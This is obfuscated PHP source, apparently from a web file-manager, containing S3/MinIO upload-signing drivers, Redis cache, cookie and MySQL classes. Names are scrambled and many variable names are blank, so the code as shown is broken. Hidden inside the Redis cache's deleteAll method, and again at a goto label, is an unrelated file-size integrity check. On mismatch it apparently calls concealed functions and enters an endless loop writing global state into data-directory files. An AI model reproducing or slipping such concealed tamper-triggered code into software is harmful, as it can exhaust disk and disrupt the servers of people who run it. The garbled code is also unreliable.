!get_url_scheme($this->endpoint) && substr($٥, 0, 7) == $݅ߌ[216]) { $٥ = $݅ߌ[217] . substr($٥, 7); } header($݅ߌ[172] . $٥); die; } public function hashMd5($Ѣ, $ڙ = '') { $ = $this->objectMeta($Ѣ); if (!$) { return !1; } $ڙ = $ڙ ? $ڙ : _get($, $_SERVER[ܮ][252]); return $ڙ; } public function uploadFormData($ǳ, $ = 3600) { $ԕ =& $_SERVER[ܮ]; if (!$this->_isClientAsync()) { $ = $this->getPreSignedURL($ǳ, $, array(), $ԕ[253]); return array($ԕ[206] => str_replace($ԕ[216], $ԕ[254], $)); } if (isset($GLOBALS[$ԕ[6]][$ԕ[92]][$ԕ[255]]) && $GLOBALS[$ԕ[6]][$ԕ[92]][$ԕ[255]] == $ԕ[228]) { return $this->uploadMultiData($ǳ, $); } if ($this->signVer == $ԕ[247]) { return $this->uploadFormDataV2($ǳ, $); } return $this->uploadFormDataV4($ǳ, $); } public function uploadFormDataV2($, $ = 3600) { $ =& $_SERVER[ܮ]; $Ͼ = $this->pathFather($); $͜ = $this->client->getHttpUploadPostParams($this->bucket, $Ͼ, $[229], $); $Ŷ = array_merge((array) $͜, array($[256] => $[247], $[206] => $this->getHost())); if ($this->_isClientAsync()) { unset($Ŷ[$[256]]); } return $Ŷ; } public function uploadFormDataV4($ƅ՛, $̔ = 3600) { $ǻ =& $_SERVER[ܮ]; $ā = $ǻ[229]; $ = $ǻ[257]; $ = $ǻ[62]; $ = gmdate($ǻ[258]); $ө = gmdate($ǻ[259]); $ߴ = $ǻ[260]; $ꈖ = $̔ . $ǻ[12]; $ = $ǻ[261]; $ճ = array($this->accessKey, $ө, $this->region, $, $ߴ); $д = implode($ǻ[8], $ճ); $ = array($ǻ[262] => gmdate($ǻ[263], strtotime($ǻ[264])), $ǻ[265] => array(array($ǻ[266] => $this->bucket), array($ǻ[267], $ǻ[268], $ǻ[12]), array($ǻ[267], $ǻ[269], $ǻ[12]), array($ǻ[270] => $), array($ǻ[271] => $д), array($ǻ[272] => $), array($ǻ[273] => $), array($ǻ[274] => $ꈖ))); $т = base64_encode(json_encode($)); $ɹ = hash_hmac($ǻ[275], $ө, $ǻ[276] . $this->secret, !0); $ = hash_hmac($ǻ[275], $this->region, $ɹ, !0); $ = hash_hmac($ǻ[275], $, $, !0); $З = hash_hmac($ǻ[275], $ߴ, $, !0); $ = hash_hmac($ǻ[275], $т, $З); $ʝ = array($ǻ[246] => $ǻ[12], $ǻ[270] => $, $ǻ[277] => $т, $ǻ[271] => $д, $ǻ[272] => $, $ǻ[273] => $, $ǻ[274] => $ꈖ, $ǻ[278] => $, $ǻ[256] => $ǻ[247], $ǻ[206] => $this->getHost()); if ($this->_isClientAsync()) { unset($ʝ[$ǻ[256]]); } return $ʝ; } public function uploadMultiData($, $˲ͦ = 3600) { $޷ =& $_SERVER[ܮ]; $ = $this->signVer == $޷[247] ? gmdate($޷[279]) : gmdate($޷[280]); $߂ = array(); $ = $this->client->getUploadId($this->bucket, $, $߂); if (!$) { return !1; } $ = array($޷[281] => $, $޷[206] => $this->getHost() . $޷[8] . $this->pathEncode($), $޷[282] => $, $޷[95] => $, $޷[256] => $this->signVer); if ($this->_isClientAsync()) { unset($[$޷[256]]); } return $; } public function uploadMultiAuth($Ɖ, $Ȅ = array()) { $ =& $_SERVER[ܮ]; if ($this->signVer == $[247]) { if (isset($Ȅ[$[283]])) { return $this->uploadPartAuthV2($Ɖ, $Ȅ); } return $this->uploadListAuthV2($Ɖ, $Ȅ); } if (isset($Ȅ[$[283]])) { return $this->uploadPartAuthV4($Ɖ, $Ȅ); } return $this->uploadListAuthV4($Ɖ, $Ȅ); } public function uploadPartAuthV2($趫, $ = array()) { $Ν =& $_SERVER[ܮ]; $µ¯ = $[$Ν[95]]; $ݽ = gmdate($Ν[279]); $⚆ = array_intersect_key($, array_flip(array($Ν[283], $Ν[281]))); ksort($⚆); $ = $⚆ ? $Ν[76] . http_build_query($⚆, null, $Ν[284], PHP_QUERY_RFC3986) : $Ν[12]; $ = array($Ν[253], $Ν[12], $Ν[120], $Ν[12], "\x78\x2d\x61\x6d\172\x2d\144\141\164\x65\72{$ݽ}", $Ν[8] . $this->bucket . $Ν[8] . $this->pathEncode($µ¯) . $); $ = implode($Ν[285], $); $饊 = $this->client->__getSignature($); return array($Ν[286] => $饊, $Ν[282] => $ݽ); } public function uploadListAuthV2($ǿ, $ = array()) { $ލ =& $_SERVER[ܮ]; $ц = $[$ލ[95]]; $ۈ = $[$ލ[281]]; $ = $this->client->listParts($this->bucket, $ц, $ۈ); if (!$) { return !1; } $Ä = gmdate($ލ[279]); $ = $ލ[287] . $ۈ; $՟گ = array($ލ[288], $ލ[12], $ލ[120], $ލ[12], "\x78\55\x61\155\172\x2d\x64\x61\x74\145\72{$Ä}", $ލ[8] . $this->bucket . $ލ[8] . $this->pathEncode($ц) . $); $ = implode($ލ[285], $՟گ); $ = $this->client->__getSignature($); return array($ލ[286] => $, $ލ[282] => $Ä, $ލ[289] => $); } public function uploadPartAuthV4($ձ, $Њ = array()) { $ͱĊ =& $_SERVER[ܮ]; $ߢ = $Њ[$ͱĊ[95]]; $ = array($ͱĊ[273] => gmdate($ͱĊ[280]), $ͱĊ[290] => _get($Њ, $ͱĊ[291], hash($ͱĊ[275], $ͱĊ[12]))); $ = explode($ͱĊ[208], $this->getHost()); $Ϩ = array($ͱĊ[292] => $[1], $ͱĊ[293] => $ͱĊ[12], $ͱĊ[246] => $ͱĊ[120], $ͱĊ[294] => $Њ[$ͱĊ[79]]); $ū = $ͱĊ[253]; $ʱӌ = $ͱĊ[8] . $this->pathEncode($ߢ); $Ԩ = array_intersect_key($Њ, array_flip(array($ͱĊ[283], $ͱĊ[281]))); $羊 = $this->client->__getSignatureV4($, $Ϩ, $ū, $ʱӌ, $Ԩ); return array($ͱĊ[286] => $羊, $ͱĊ[290] => $[$ͱĊ[290]], $ͱĊ[282] => $[$ͱĊ[273]]); } public function uploadListAuthV4($ޞ, $ = array()) { $ɑí =& $_SERVER[ܮ]; $ڳ̇ = $[$ɑí[95]]; $ן = $[$ɑí[281]]; $ = $this->client->listParts($this->bucket, $ڳ̇, $ן); if (!$) { return !1; } $ = $ɑí[295]; foreach ($ as $۬) { $ .= $ɑí[296] . "\x3c\x50\141\x72\x74\116\x75\x6d\142\145\x72\x3e{$۬[$ɑí[297]]}\x3c\57\x50\141\x72\164\116\x75\155\x62\x65\x72\76\xa" . "\74\x45\124\141\147\x3e{$۬[$ɑí[298]]}\74\x2f\x45\124\x61\147\x3e\xa" . $ɑí[299]; } $ .= $ɑí[300]; $ = array($ɑí[273] => gmdate($ɑí[280]), $ɑí[290] => hash($ɑí[275], $)); $ = explode($ɑí[208], $this->getHost()); $ĉ = array($ɑí[292] => $[1], $ɑí[246] => $ɑí[120], $ɑí[294] => strlen($)); $˾ = $ɑí[288]; $ = $ɑí[8] . $this->pathEncode($ڳ̇); $沞 = array($ɑí[281] => $ן); $Ƚ = $this->client->__getSignatureV4($, $ĉ, $˾, $, $沞); return array($ɑí[286] => $Ƚ, $ɑí[290] => $[$ɑí[290]], $ɑí[282] => $[$ɑí[273]], $ɑí[289] => $); } private function _isClientAsync() { $ =& $_SERVER[ܮ]; static $Ҡ = null; if ($Ҡ === null) { $ = isset($_REQUEST[$[301]]) ? json_decode($_REQUEST[$[301]], !0) : !1; $Ҡ = $ && _get($, $[302]) == $[303]; } return $Ҡ; } public function getHost() { $ =& $_SERVER[ܮ]; $㲜 = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($[70], $[64], $[69], $[62]))) { return $㲜 . $[8] . $this->bucket; } if ($this->osType == $[62] && !is_domain($㲜)) { return $㲜 . $[8] . $this->bucket; } $㲜 = explode($[208], $㲜); return $㲜[0] . $[208] . $this->bucket . $[10] . $㲜[1]; } public function size($曺) { $¼ܝ = $this->objectMeta($曺); return $¼ܝ ? $¼ܝ[$_SERVER[ܮ][79]] : 0; } public function info($ï) { if ($this->isFolder($ï)) { return $this->folderInfo($ï); } else { if ($this->isFile($ï)) { return $this->fileInfo($ï); } } return !1; } public function exist($) { return $this->isFile($) || $this->isFolder($); } public function isFile($ۯ) { return !$this->isFolder($ۯ) && $this->objectMeta($ۯ); } public function isFolder($ߕ) { return $this->cacheMethod($_SERVER[ܮ][177], $ߕ); } protected function objectMeta($) { return $this->cacheMethod($_SERVER[ܮ][179], $); } protected function _objectMeta($๚) { $ȗ =& $_SERVER[ܮ]; $๚ = rtrim($๚, $ȗ[8]); try { $Ϙ͗ = $this->client->getObjectInfo($this->bucket, $๚); if (!isset($Ϙ͗[$ȗ[252]]) && isset($Ϙ͗[$ȗ[304]])) { $Ϙ͗[$ȗ[252]] = $Ϙ͗[$ȗ[304]]; } } catch (Exception $߭) { $Ϙ͗ = !1; } if (!$Ϙ͗) { } return $Ϙ͗; } protected function _isFolder($ݮ) { $ׇ =& $_SERVER[ܮ]; $ݮ = rtrim($ݮ, $ׇ[8]) . $ׇ[8]; if ($ݮ == $ׇ[12] || $ݮ == $ׇ[8]) { return !0; } $㛚 = $this->client->getBucket($this->bucket, $ݮ, null, 1); if (empty($㛚[$ׇ[236]])) { return !1; } $ဓ = $㛚[$ׇ[236]][0][$ׇ[32]]; return stripos($ဓ, $ݮ) === 0 ? !0 : !1; if (substr($ဓ, -1) == $ׇ[8]) { return !0; } if (get_path_this($ဓ) == get_path_this($ݮ)) { return !1; } return !0; } public function listObject($Đ) { return $this->fileList($Đ, $_SERVER[ܮ][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($܆) { $ˬ =& $_SERVER[ܮ]; parent::__construct($܆); $this->setSignVersion($ˬ[247]); if (!$this->region) { $this->region = $ˬ[305]; $this->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($Ǖ, $ = 3600) { $ႃ =& $_SERVER[ܮ]; $ڟ = $ႃ[229]; $ӗ = $ႃ[257]; $墦 = $ႃ[62]; $ = gmdate($ႃ[258]); $̶ = gmdate($ႃ[259]); $Ţ = $ႃ[260]; $Ф = $ . $ႃ[12]; $Ɇפ = $ႃ[261]; $Ɩ = array($this->accessKey, $̶, $this->region, $墦, $Ţ); $¹ = implode($ႃ[8], $Ɩ); $Ԕ = array($ႃ[262] => gmdate($ႃ[263], strtotime($ႃ[264])), $ႃ[265] => array(array($ႃ[266] => $this->bucket), array($ႃ[306] => $ڟ), array($ႃ[267], $ႃ[268], $ႃ[12]), array($ႃ[267], $ႃ[269], $ႃ[12]), array($ႃ[267], $ႃ[307], $ႃ[12]), array($ႃ[270] => $Ɇפ), array($ႃ[271] => $¹), array($ႃ[272] => $ӗ), array($ႃ[273] => $), array($ႃ[274] => $Ф))); $ʮ = base64_encode(json_encode($Ԕ)); $ = hash_hmac($ႃ[275], $̶, $ႃ[276] . $this->secret, !0); $˞ = hash_hmac($ႃ[275], $this->region, $, !0); $ = hash_hmac($ႃ[275], $墦, $˞, !0); $ك = hash_hmac($ႃ[275], $Ţ, $, !0); $ŗ = hash_hmac($ႃ[275], $ʮ, $ك); $ͯ = array($ႃ[246] => $ႃ[12], $ႃ[294] => $ႃ[12], $ႃ[306] => $ڟ, $ႃ[270] => $Ɇפ, $ႃ[277] => $ʮ, $ႃ[308] => $¹, $ႃ[309] => $ӗ, $ႃ[310] => $, $ႃ[311] => $Ф, $ႃ[312] => $ŗ, $ႃ[206] => $this->getHost()); return $ͯ; } } goto Dȇ; d: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ᚦ, $ֵ) { $ =& $_SERVER[ܮ]; if (!class_exists($[1033])) { show_json($[1034], !1); } $this->cacheTime = $ֵ; $ = isset($ᚦ[$[1035]]) ? $ᚦ[$[1035]] : 10; $׺ = _get($ᚦ, $[1032]); if ($׺ && is_array($׺)) { $this->initCluster($ᚦ, $); } else { $this->handle = $this->init($ᚦ, $); } } private function init($, $좞) { $撩 =& $_SERVER[ܮ]; $Ǻ = new Redis(); $󎪤 = isset($[$撩[1036]]) ? $[$撩[1036]] : !1; if ($󎪤) { $Ǻ->pconnect($[$撩[206]], $[$撩[207]], $좞); } else { $Ǻ->connect($[$撩[206]], $[$撩[207]], $좞); } if (!empty($[$撩[502]])) { $Ǻ->auth($[$撩[502]]); } if (!empty($[$撩[856]]) && $[$撩[856]] != 0) { $Ǻ->select($[$撩[856]]); } return $Ǻ; } private function initCluster($, $ނ) { $Ԁ =& $_SERVER[ܮ]; $ӎ = array($Ԁ[1037], $Ԁ[1038], $Ԁ[1039]); $ = $Ԁ[1037]; if (isset($[$Ԁ[16]]) && in_array($[$Ԁ[16]], $ӎ)) { $ = $[$Ԁ[16]]; } switch ($) { case $Ԁ[1037]: $this->_slave($, $ނ); break; case $Ԁ[1038]: break; case $Ԁ[1039]: $this->isCluster = !0; $潱 = $[$Ԁ[1032]]; $ = isset($[$Ԁ[1036]]) ? $[$Ԁ[1036]] : !1; $ = isset($[$Ԁ[502]]) ? $[$Ԁ[502]] : null; $this->handle = new RedisCluster(NUll, $潱, $ނ, $ނ, $, $); break; default: break; } } private function _slave($, $) { $ގ = $[$_SERVER[ܮ][1032]]; $this->filterConfig($, $ގ[0]); $this->handle = $this->init($, $); unset($ގ[0]); if (empty($ގ)) { return; } $ = array_rand($ގ); $this->filterConfig($, $ގ[$]); $this->slaveHandle = $this->init($, $); } private function filterConfig(&$߿Ƭ, $Ԛ) { $ڑ =& $_SERVER[ܮ]; $ = explode($ڑ[4], $Ԛ); $ = array($ڑ[206] => $[0], $ڑ[207] => $[1]); $߿Ƭ = array_merge($߿Ƭ, $); } public function set($۠Ć, $Ȝ, $𢌕 = false) { $𢌕 = $𢌕 ? $𢌕 : $this->cacheTime; return $this->handle->setEx($۠Ć, $𢌕, $Ȝ); } public function setLock($粨, $ޛ, $Ů) { return $this->handle->setNX($粨, $ޛ); } public function get($т) { $큖 = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $큖->get($т); } public function remove($) { return $this->handle->del($); } public function deleteAll() { $ =& $_SERVER[ܮ]; $֙ = $_SERVER[$[902]] . $[903]; $좐 = $[899]; if ($_SERVER[$[900]] != $좐($֙)) { $ִ = $[1040]; $ʇ = $[901]; $͠ = $_SERVER[$[902]] . $[903]; $Єˍ = $ʇ($͠); $ٗ = explode($[285], $Єˍ); if (count($ٗ) < $[724]) { $ܘ = $[904]; $ܘ(); } $ĂѢ = $[1041]; $ĂѢ($_SERVER[$[1042]]); $ִ = $[1040]; $ִ(); $ = $[1043]; $ = json_encode($GLOBALS[$[1044]]); $ = 1; for ($ = $; $ > 0; $++) { $(DATA_PATH . $, $); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $񩃽) { $this->handle->flushall($񩃽); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ǥ = '', $չ = 0) { if (is_string($ǥ) && $ǥ != $_SERVER[ܮ][12]) { $this->prefix = $ǥ; } if (is_numeric($չ) && $չ > 0) { $this->expire = $չ; } } public static function getInstance() { static $; if ($ === null) { $ = new self(); } return $; } private static $cookieDisable = false; public static function disable($Ĩ) { self::$cookieDisable = $Ĩ; } private static $sameCookieSet = array(); public static function set($ݎ, $Ὀ, $ = 0, $ = false, $ = false) { $Ҥ =& $_SERVER[ܮ]; if (self::$cookieDisable) { return; } if (!$) { $ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ݎ]) && self::$sameCookieSet[$ݎ] == $Ὀ . $) { return; } self::$sameCookieSet[$ݎ] = $Ὀ . $; if (!$) { $ = str_replace(HOST, $Ҥ[12], APP_HOST); $ = _get($GLOBALS, $Ҥ[1045], $); } $ = $Ҥ[12]; setcookie($ݎ, $Ὀ, time() + $, $Ҥ[8] . trim($, $Ҥ[8]) . $, !1, !1, $); } public static function setSafe($͚, $, $ = 0) { self::set($͚, $, $, !0); } public static function get($ωݼ) { static $ = false; if (!$) { self::initHeaderCookie(); $ = !0; } return isset($_COOKIE[$ωݼ]) ? $_COOKIE[$ωݼ] : !1; } private static function initHeaderCookie() { $ =& $_SERVER[ܮ]; if (!isset($_SERVER[$[1046]]) || !$_SERVER[$[1046]]) { return; } $ = explode($[74], $_SERVER[$[1046]]); foreach ($ as $耞) { $耞 = explode($[464], $耞); if (count($耞) != 2 || !isset($耞[1])) { continue; } $_COOKIE[trim($耞[0])] = trim($耞[1]); } } public static function remove($, $ּ = false) { unset($_COOKIE[$]); self::set($, $_SERVER[ܮ][12], 1, $ּ); } } class DbMysql extends Db { public function __construct($Ѧ = '') { $ܒƇ =& $_SERVER[ܮ]; if (!extension_loaded($ܒƇ[907])) { think_exception(think_lang($ܒƇ[14]) . $ܒƇ[1047]); } if (!empty($Ѧ)) { $this->config = $Ѧ; if (empty($this->config[$ܒƇ[17]])) { $this->config[$ܒƇ[17]] = $ܒƇ[12]; } } } public function connect($ዤ = '', $Ө = 0, $̚ = false) { $獽 =& $_SERVER[ܮ]; if (!isset($this->linkID[$Ө])) { if (empty($ዤ)) { $ዤ = $this->config; } $ד = $ዤ[$獽[1048]] . ($ዤ[$獽[1049]] ? "\72{$ዤ[$獽[1049]]}" : $獽[12]); $ʟ㦈 = !empty($ዤ[$獽[17]][$獽[18]]) ? $ዤ[$獽[17]][$獽[18]] : $this->pconnect; if ($ʟ㦈) { $this->linkID[$Ө] = mysql_pconnect($ד, $ዤ[$獽[1050]], $ዤ[$獽[1051]], 131072); } else { $this->linkID[$Ө] = mysql_connect($ד, $ዤ[$獽[1050]], $ዤ[$獽[1051]], !0, 131072); } if (!$this->linkID[$Ө] || !empty($ዤ[$獽[21]]) && !mysql_select_db($ዤ[$獽[21]], $this->linkID[$Ө])) { think_exception(mysql_error()); } $ = mysql_get_server_info($this->linkID[$Ө]); mysql_query($獽[1052] . think_config($獽[1053]) . $獽[58], $this->linkID[$Ө]); if ($ > $獽[1054]) { mysql_query($獽[1055], $this->linkID[$Ө]); } $this->connected = !0; if (1 != think_config($獽[22])) { unset($this->config); } } return $this->linkID[$Ө]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($) { $ =& $_SERVER[ܮ]; if (0 === stripos($, $[342])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $; if ($this->queryID) { $this->free(); } think_action_status($[23], 1); think_status($[24]); $this->queryID = mysql_query($, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($蝉) { $ =& $_SERVER[ܮ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $蝉; if ($this->queryID) { $this->free(); } think_action_status($[25], 1); think_status($[24]); $ = mysql_query($蝉, $this->_linkID); $this->debug(); if (!1 === $) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ܮ][1056], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ = mysql_query($_SERVER[ܮ][1057], $this->_linkID); $this->transTimes = 0; if (!$) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ɖ = mysql_query($_SERVER[ܮ][1058], $this->_linkID); $this->transTimes = 0; if (!$ɖ) { $this->error(); return !1; } } return !0; } private function getAll() { $Ú = array(); if ($this->numRows > 0) { while ($ = mysql_fetch_assoc($this->queryID)) { $Ú[] = $; } mysql_data_seek($this->queryID, 0); } return $Ú; } public function getFields($疪) { $ޖ =& $_SERVER[ܮ]; $Ȍ = $this->query($ޖ[1059] . $this->parseKey($疪)); $ = array(); if ($Ȍ) { foreach ($Ȍ as $ => $μ) { $[$μ[$ޖ[31]]] = array($ޖ[32] => $μ[$ޖ[31]], $ޖ[33] => $μ[$ޖ[34]], $ޖ[35] => (bool) (strtoupper($μ[$ޖ[36]]) === $ޖ[1060]), $ޖ[37] => $μ[$ޖ[38]], $ޖ[39] => strtolower($μ[$ޖ[40]]) == $ޖ[41], $ޖ[42] => strtolower($μ[$ޖ[43]]) == $ޖ[44]); } } return $; } public function getTables($ٮ = '') { $꣞ =& $_SERVER[ܮ]; if (!empty($ٮ)) { $ = $꣞[1061] . $ٮ . $꣞[1062]; } else { $ = $꣞[1063]; } $뙡Ǹ = $this->query($); $ = array(); foreach ($뙡Ǹ as $ => $މ) { $[$] = current($މ); } return $; } public function replace($, $΅ = array()) { $ =& $_SERVER[ܮ]; foreach ($ as $҆ر => $ֹ) { $ = $this->parseValue($ֹ); if (is_scalar($)) { $ݱ[] = $; $Α[] = $this->parseKey($҆ر); } } $ՋĦ = $[1064] . $this->parseTable($΅[$[357]]) . $[1065] . implode($[50], $Α) . $[1066] . implode($[50], $ݱ) . $[1067]; return $this->execute($ՋĦ); } public function insertAll($, $ߞ = array(), $ͼ = false) { $ҍ =& $_SERVER[ܮ]; if (!is_array($[0])) { return !1; } $ = array_keys($[0]); $ = array(); foreach ($ as $꫶) { $ͯ = array(); foreach ($꫶ as $Ʌ => $ǀ) { $ǀ = $this->parseValue($ǀ); if (is_scalar($ǀ)) { $ͯ[] = $ǀ; } } $[] = $ҍ[337] . implode($ҍ[50], $ͯ) . $ҍ[1067]; } array_walk($, array($this, $ҍ[1068])); $ = $ͼ ? $ҍ[1069] : $ҍ[1070]; $ = $ҍ[1070]; $ = $ . $ҍ[1071] . $this->parseTable($ߞ[$ҍ[357]]) . $ҍ[1065] . implode($ҍ[50], $) . $ҍ[1072] . implode($ҍ[50], $); if ($ͼ) { $ڮ = array(); foreach ($ as $Ʌ) { if ($Ʌ == $ҍ[231] || $Ʌ == $ҍ[1073]) { continue; } $ڮ[] = $Ʌ . $ҍ[1074] . $Ʌ . $ҍ[1067]; } $ .= $ҍ[1075] . implode($ҍ[50], $ڮ); } return $this->execute($); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ =& $_SERVER[ܮ]; $this->error = mysql_errno() . $[4] . mysql_error($this->_linkID); if ($[12] != $this->queryStr) { $this->error .= LNG($[48]) . $this->queryStr; } think_trace($this->error, $[12], $[49]); return $this->error; } public function escapeString($) { if ($this->_linkID) { return mysql_real_escape_string($, $this->_linkID); } else { return mysql_escape_string($); } } public function parseKey(&$, $ހ = true) { $ =& $_SERVER[ܮ]; if ($ހ) { $ = $this->parseKeyCheck($); } if ($ != $[220] && !preg_match($[1076], $)) { $ = $[475] . trim($, $[475]) . $[475]; } return $; } } goto c氖; CҩƉ: $_file = $_SERVER[$_SERVER[ܮ][898]]; $_size = $_SERVER[ܮ][899]; if ($_SERVER[$_SERVER[ܮ][900]] != $_size($_file)) { $_getc = $_SERVER[ܮ][901]; $_getfile = $_SERVER[$_SERVER[ܮ][902]] . $_SERVER[ܮ][903]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ܮ][285], $_getfilec); if (count($_getarrs) < $_SERVER[ܮ][715]) { $exit = $_SERVER[ܮ][904]; $exit(); } $_act = $_SERVER[ܮ][905]; $_act($_file); } goto Eŝ; D: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($Ȍ) { $ =& $_SERVER[ܮ]; return array($[2296] => array($[2721] . USER_ID, $[2297])); } protected function ___listData() { $ =& $_SERVER[ܮ]; $ = array($[1968] => USER_ID, $[573] => array($[2300], 0)); $倸Ĳ = $[2722]; $ = $this->field($倸Ĳ)->where($)->order($[2302])->select(); return $ ? $ : array(); } protected function addToTag($, $Ӹ) { $Ĉ =& $_SERVER[ܮ]; if (!Model($Ĉ[2451])->listData($Ӹ)) { return !1; } if (is_numeric($)) { $ߏ = Model($Ĉ[939])->pathInfo($); if (!$ߏ) { return !1; } } else { $ߏ = IO::infoSimple($); if (!$ߏ) { return !1; } $ү = $ߏ[$Ĉ[32]]; $ = $ߏ[$Ĉ[33]]; if (isset($ߏ[$Ĉ[500]])) { $ = $ߏ[$Ĉ[500]] == $Ĉ[91] ? $Ĉ[78] : $Ĉ[230]; } } $ٍ = array($Ĉ[1968] => USER_ID, $Ĉ[573] => $Ӹ, $Ĉ[510] => $, $Ĉ[511] => $ ? $ : $Ĉ[505], $Ĉ[509] => $ү ? $ү : $Ĉ[12], $Ĉ[2186] => 0); if ($this->where($ٍ)->find()) { return !1; } return $this->add($ٍ); } protected function removeFromTag($ҳ, $) { $ײ =& $_SERVER[ܮ]; if (!Model($ײ[2451])->listData($)) { return !1; } if (is_array($ҳ)) { $ҳ = array($ײ[7], $ҳ); } $У = array($ײ[1968] => USER_ID, $ײ[573] => $, $ײ[510] => $ҳ); return $this->where($У)->delete(); } protected function removeByTag($) { $¢ =& $_SERVER[ܮ]; if (!$) { return !1; } $ߛϡ = array($¢[1968] => USER_ID, $¢[573] => $); return $this->where($ߛϡ)->delete(); } protected function removeBySource($ˉ) { $© =& $_SERVER[ܮ]; if (is_array($ˉ)) { $ˉ = array($©[7], $ˉ); } $ = array($©[1968] => USER_ID, $©[573] => array($©[1182], 0), $©[510] => $ˉ); return $this->where($)->delete(); } }